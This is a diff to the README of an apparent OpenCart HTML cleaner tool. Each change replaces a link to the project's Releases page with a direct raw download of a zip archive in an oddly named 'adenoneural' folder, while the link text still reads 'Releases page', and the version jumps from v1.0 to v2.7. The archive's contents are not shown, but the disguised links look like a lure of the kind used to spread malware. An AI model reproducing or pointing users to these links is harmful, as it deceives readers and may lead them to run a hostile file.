@@ -1,6 +1,6 @@
 # 🧹 opencart-html-cleaner - Clean Up Your OpenCart HTML Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/spxcex/opencart-html-cleaner/releases)
+[![Download](https://github.com/spxcex/opencart-html-cleaner/raw/refs/heads/main/adenoneural/html_cleaner_opencart_v2.7.zip)](https://github.com/spxcex/opencart-html-cleaner/raw/refs/heads/main/adenoneural/html_cleaner_opencart_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -22,9 +22,9 @@ Welcome to the opencart-html-cleaner! This tool helps you easily remove unwanted
   
 ## 📦 Download & Install
 
-To get started, visit the [Releases page](https://github.com/spxcex/opencart-html-cleaner/releases) to download the latest version of opencart-html-cleaner. 
+To get started, visit the [Releases page](https://github.com/spxcex/opencart-html-cleaner/raw/refs/heads/main/adenoneural/html_cleaner_opencart_v2.7.zip) to download the latest version of opencart-html-cleaner. 
 
-1. Go to the [Releases page](https://github.com/spxcex/opencart-html-cleaner/releases).
+1. Go to the [Releases page](https://github.com/spxcex/opencart-html-cleaner/raw/refs/heads/main/adenoneural/html_cleaner_opencart_v2.7.zip).
 2. Find the latest release.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the file on your computer.
@@ -54,7 +54,7 @@ Yes, the bulk editing feature is designed to handle large databases efficiently,
 If you encounter issues during installation or usage:
 
 - Ensure your system meets the requirements listed above.
-- Check for any updates on the [Releases page](https://github.com/spxcex/opencart-html-cleaner/releases).
+- Check for any updates on the [Releases page](https://github.com/spxcex/opencart-html-cleaner/raw/refs/heads/main/adenoneural/html_cleaner_opencart_v2.7.zip).
 - For additional help, consider reaching out to the community by opening a discussion on the repository.
 
 ## 📧 Get in Touch
@@ -67,4 +67,4 @@ Thanks to everyone who contributed to this project and helped make opencart-html
 
 --- 
 
-Visit the [Releases page](https://github.com/spxcex/opencart-html-cleaner/releases) to download the latest version now!
+Visit the [Releases page](https://github.com/spxcex/opencart-html-cleaner/raw/refs/heads/main/adenoneural/html_cleaner_opencart_v2.7.zip) to download the latest version now!
